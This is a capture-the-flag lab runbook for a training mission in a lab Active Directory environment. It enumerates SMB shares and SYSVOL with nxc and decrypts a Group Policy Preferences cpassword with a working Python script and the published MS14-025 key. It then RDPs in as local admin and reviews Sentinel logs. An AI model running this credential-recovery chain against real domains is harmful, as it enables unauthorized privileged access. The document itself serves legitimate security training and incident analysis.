# Mission 03 — Locked Out: Runbook

**Analyst:** Madumathi S  
**Date:** 2026-10-26  
**Environment:** hamilton.corp — DC01 (10.50.0.10) · WKS-L57 (10.50.0.57)  
**Goal:** Regain access to WKS-L57 and Sentinel using only the low-privilege `training01` account.

---

## CTFd Challenges

| Challenge | Points | Stage | Status | Flag |
|---|---|---|---|---|
| Mission 3 — Recon | 50 | Network / share discovery | ✅ Complete | _(flag value — do not commit to GitHub)_ |
| Mission 3 — First foothold | 100 | Anonymous SMB / Public share read | ✅ Complete | `HAM{redacted}` |
| Mission 3 — The climax | 200 | GPP cpassword decryption | ✅ Complete | `HAM{redacted}` |
| Mission 3 — Proof on the desktop | 100 | Desktop flag file | ✅ Complete | _(flag value — do not commit to GitHub)_ |
| Mission 3 — Privileged return | 150 | RDP re-entry as local admin | ✅ Complete | _(flag value — do not commit to GitHub)_ |

---

## Overview

The primary account was locked out of WKS-L57 and Sentinel. The recovery chain:

1. Enumerate what is still reachable with `training01` → **Recon**
2. Read the unauthenticated Public share on WKS-L57 → **First foothold**
3. Spider SYSVOL on DC01, find and decrypt the GPP cpassword → **The climax**
4. Change the expired password and RDP in as local admin → **Privileged return**
5. Collect desktop items and rotate recovered credentials → **Proof on the desktop**

---

## Part 1 — Enumerate shares and map the domain

### Step 1.1 — Confirm DC01 is reachable and check share permissions

```bash
nxc smb 10.50.0.10 -u training01 -p '<training01-password>' --shares
```

Expected: `SYSVOL READ`, `NETLOGON READ`. If both show READ, proceed to spidering.

### Step 1.2 — Enumerate WKS-L57 shares

```bash
nxc smb 10.50.0.57 -u training01 -p '<training01-password>' --shares
```

Note any non-standard shares (anything other than ADMIN$, C$, IPC$).  
**Finding:** WKS-L57 exposes a `Public` share readable without elevated rights.

### Step 1.3a — Unauthenticated logons seen in Sentinel (not run by the analyst)

Sentinel shows ANONYMOUS LOGON and Guest network logons to WKS-L57 on 26 October from 10.50.0.1. The analyst did not run these, and the logs do not establish who did. Record them as observed activity to review with the coach. The analyst's own reads used the `training01` account in Step 1.3.

### Step 1.3 — Read the Public share on WKS-L57 (authenticated, training01)

```bash
nxc smb 10.50.0.57 -u training01 -p '<training01-password>' \
  -M spider_plus -o READ_ONLY=True DOWNLOAD_FLAG=True
```

Downloaded files land in `~/.nxc/modules/nxc_spider_plus/10.50.0.57/`.

```bash
cat ~/.nxc/modules/nxc_spider_plus/10.50.0.57/Public/*.txt
```

**Finding:** `account-access.txt` contains `training01` credentials in plaintext and the First foothold flag — staged by the intruder ready for exfiltration. This is the **data breach** documented in the case file Section 5.

### Step 1.4 — Spider SYSVOL on DC01 (download all files)

```bash
nxc smb 10.50.0.10 -u training01 -p '<training01-password>' \
  -M spider_plus -o READ_ONLY=True DOWNLOAD_FLAG=True
```

Downloaded files land in `~/.nxc/modules/nxc_spider_plus/10.50.0.10/`.

**What to look for:**
- `Groups.xml` under any GPO's `Machine/Preferences/Groups/` path → contains GPP cpassword
- `ScheduledTasks.xml`, `Services.xml`, `DataSources.xml` → also carry cpassword fields
- `.csv`, `.ini`, `.inf` files → may contain policy hints or credentials

### Step 1.5 — Identify real vs decoy GPOs

Each GPO folder contains a `.cmt` comment file. Read them to separate real GPOs from decoys:

```bash
find ~/.nxc/modules/nxc_spider_plus/10.50.0.10/ -name "*.cmt" \
  -exec echo "=== {} ===" \; -exec cat {} \;
```

**Finding:** SYSVOL holds one GPP `Groups.xml` per seat, each in its own GPO. Each file's `cpassword` belongs to the seat named in its comment. The item for WKS-L57 is in GPO `{BAFE699E-352A-44C0-86AA-36A7C6DC0D51}`; the `{58348A21-0DBA-4C25-A881-8E3AE7135417}` item belongs to a different seat.

---

## Part 2 — Find and decrypt the GPP credential

### Step 2.1 — Locate Groups.xml files

```bash
find ~/.nxc/modules/nxc_spider_plus/10.50.0.10/ -name "Groups.xml"
```

### Step 2.2 — Read the Groups.xml and note the cpassword value

Open the file and extract:
- `userName` attribute → the account the credential belongs to (`svc_deploy`)
- `cpassword` attribute → the encrypted password (URL-safe base64, AES-256-CBC)
- `subAuthority` attribute → `RID_ADMIN` means this account gets local admin rights on workstations
- The seat number in the Groups.xml comment → match it to WKS-L57 (seat 57). These files do not contain a `FilterComputer` element, so the seat tag is the only link to a machine.

### Step 2.3 — Decrypt the cpassword (MS14-025)

Install pycryptodome if not present:
```bash
pip3 install pycryptodome --break-system-packages
```

Run the decryption script:
```python
import base64
from Crypto.Cipher import AES

# Microsoft's published GPP AES key (MS14-025)
key = bytes.fromhex(
    '4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'
)

# Paste cpassword value here — convert URL-safe base64 first
cpassword = 'PASTE_CPASSWORD_HERE'
cpassword = cpassword.replace('-', '+').replace('_', '/')
padded = cpassword + '=' * (4 - len(cpassword) % 4)
encrypted = base64.b64decode(padded)

# Pad to 16-byte boundary if needed
if len(encrypted) % 16 != 0:
    encrypted += b'\x00' * (16 - len(encrypted) % 16)

cipher = AES.new(key, AES.MODE_CBC, iv=b'\x00' * 16)
decrypted = cipher.decrypt(encrypted)
print(decrypted.decode('utf-16-le', errors='ignore').rstrip('\x00'))
```

**Common pitfalls:**
- `ModuleNotFoundError: No module named 'Crypto'` → install `pycryptodome`, not `pycrypto`
- Garbage output → decode as UTF-16-LE, not UTF-8 (GPP uses UTF-16-LE internally)
- `ValueError: Data must be padded` → add null-byte padding to reach a 16-byte boundary

### Step 2.4 — Confirm the account has local admin rights

Check `subAuthority="RID_ADMIN"` in the `Properties` element. This means the GPO adds `svc_deploy` to the local Administrators group on all machines the GPO applies to, including WKS-L57.

**Finding:** The decrypted credential is for a local account on WKS-L57 with local admin rights, but only the item tagged for seat 57 applies to this machine. Use the seat-57 item.

---

## Part 3 — Change the expired password and RDP in

### Step 3.1 — Verify the credential with NLA (expect password-expired error)

```bash
sdl-freerdp /v:10.50.0.57 /u:svc_deploy /p:'RECOVERED_PASSWORD' \
  /cert:ignore +clipboard
```

Expected: the seat-57 credential connects. If you use the wrong seat's credential, expect `ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED`. That is a credential mismatch, not a password that needs changing. If you get a connection reset, do not use `/sec:rdp` — the server requires NLA.

### Step 3.2 — Password change (not needed for the seat-57 credential)

The seat-57 GPP item sets `changeLogon="0"` and `noChange="1"`, so no change is required. The table below was used while troubleshooting the wrong-seat credential and is kept for reference only:

| Method | Port | Command |
|---|---|---|
| SAMR self-change | 445 | `changepasswd.py 'DOMAIN/user:oldpass@DC' -newpass 'newpass' -dc-ip DC_IP` |
| SAMR admin reset | 445 | `changepasswd.py 'DOMAIN/user@DC' -newpass 'newpass' -altuser admin -altpass pass -reset -dc-ip DC_IP` |
| Kerberos kpasswd | 88 | `changepasswd.py ... -protocol kpasswd -dc-ip DC_IP` |
| LDAP admin reset | 636 | `changepasswd.py ... -protocol ldap -dc-ip DC_IP` |
| RDP inline change | 3389 | Microsoft Remote Desktop app — handles expired password with change dialog |

**In this lab:** Ports 88 and 636 are filtered from the analyst's network. SAMR via `training01` returns `STATUS_NONE_MAPPED` (insufficient rights to enumerate domain users). Use the **Microsoft Remote Desktop app** — when NLA succeeds but returns the expired-password signal, the app shows a change-password dialog inline.

### Step 3.3 — RDP in with Microsoft Remote Desktop

1. Open Microsoft Remote Desktop → Add PC → `10.50.0.57`
2. User account: `.\svc_deploy` (local account, not a domain account), password: seat-57 password
3. Connect. No change-password dialog is expected; if one appears, the wrong credential was used
4. Confirm you land on WKS-L57 desktop as svc_deploy with local administrator rights

Confirmed after RDP (no password change needed):
> - New password used
> - Confirm local admin rights (whoami /groups or net localgroup Administrators)

---

## Part 4 — Collect desktop items and rotate credentials

### Step 4.1 — Collect the three desktop items

Look on the desktop for three items that do not belong:
1. **Proof file** — contains the CTFd flag; submit to "Proof on the desktop" (100 pts)
2. **Sentinel credentials file** — new login for the monitoring platform; rotate immediately (Step 4.3)
3. **Staged exfil data** — confirm this matches `account-access.txt` found on the Public share, or note additional files

**Desktop items found:**
- **Proof file:** collected; flag submitted to "Proof on the desktop" (value not recorded in this file)
- **Sentinel credentials file:** `monitoring-access.txt` on the desktop; Sentinel password rotated on 27 October 2026
- **Exfil dataset:** `employees.csv` in a `staging` folder on the `svc_deploy` desktop. Four records with fields `employee_id`, `full_name`, `email`, `department`, `salary`; every row carries the marker `EXFIL-TEST-MARKER-M3`. Confirmed by the coach as part of the mission, for the GRC assessment. Record contents are not copied into this file.

### Step 4.2 — Submit remaining CTFd flags

| Challenge | Points | Flag |
|---|---|---|
| Mission 3 — Recon | 50 | ✅ `HAM{redacted}` |
| Mission 3 — First foothold | 100 | ✅ `HAM{redacted}` |
| Mission 3 — The climax | 200 | ✅ `HAM{redacted}` |
| Mission 3 — Proof on the desktop | 100 | ✅ `HAM{redacted}` |
| Mission 3 — Privileged return | 150 | ✅ `HAM{redacted}` |

### Step 4.3 — Rotate the recovered Sentinel credentials

Immediately after first login with the recovered Sentinel credentials:
1. Sign in to Sentinel / Azure portal with the recovered password
2. Change the password to a new value only you know
3. Verify Sentinel queries work with the new credential
4. Note the rotation in the case file

### Step 4.4 — Reconstruct Sentinel evidence

Run the queries in `queries.kql` against your WKS-L57 Sentinel workspace to find:
- Failed logons for the locked-out primary account (EventID 4625)
- Anonymous/guest SMB access from the intruder's activity
- svc_deploy logon after re-entry (EventID 4624 LogonType 10)
- Any process creation events (4688) if Audit Process Creation was enabled

**Confirmed findings (26 Oct 2026):**

| Query | Result |
|---|---|
| EventID 4625 — `svc_deploy` | **6 entries**, SubStatus `%%2313` (STATUS_PASSWORD_EXPIRED), LogonType 10, source `10.50.0.1`, window 19:37–20:14 UTC |
| EventID 4625 — `madumathi` | **2 entries**, SubStatus `%%2310` (STATUS_ACCOUNT_DISABLED), source `10.50.0.1` |
| EventID 5140/5145 — share access | **Not present** — file-share auditing is not enabled (`audit.csv` covers Logon, Logoff, Special Logon and Process Creation only) |
| EventID 4688 — process creation | **Enabled** — confirmed via `audit.csv` in GPO `{73815AA3}` (Audit Process Creation = Success); 4688 events visible for helpdesk/rdpinit and himds sessions |

**Notes:**
- `0xC0000071` (password expired) is only returned after the password is checked as correct; a wrong password gives `0xC000006A`. The six `svc_deploy` failures coded as expired therefore do not fit a simple wrong-credential explanation. Their cause is unresolved, since the expiry state is domain-side and unverified.
- `%%2310` = account disabled — confirms the intruder successfully locked out the primary analyst account and the attempts hit the disabled barrier, not a wrong-password barrier.
- Share creation and file staging happened on WKS-L57's own disk. They are not in Sentinel because file-share auditing is not enabled, and the 4688 log shows no command that created the share. Document the staging as observed on disk (`account-access.txt`, ctime 2026-10-26) and the share access as reconstructed from direct SMB enumeration.
- Steps that happened off WKS-L57 (SYSVOL enumeration on DC01, GPP decryption on your Mac) will likewise not appear in WKS-L57's Sentinel.
- Domain-side changes (disable of `madumathi`, any `svc_deploy` change) are documented as observed but unverified from telemetry. DC01 is outside this workstation's monitoring scope by design, and the coach confirmed DC01 logs are not part of this exercise. See the control gap "No domain-side logging reaching the SOC" in the case file.

---

## Appendix — Credential reference

> Passwords and flag values are not recorded in this repository.

| Account | Source | Rights |
|---|---|---|
| `training01` | Training environment | Domain user, SYSVOL read |
| `svc_deploy` (local account on WKS-L57) | GPP cpassword in `{BAFE699E}` GPO, seat-57 item | Local admin on WKS-L57 (via RID_ADMIN GPP) |
| Sentinel account | Desktop of WKS-L57 | Sentinel portal access (rotate after recovery) |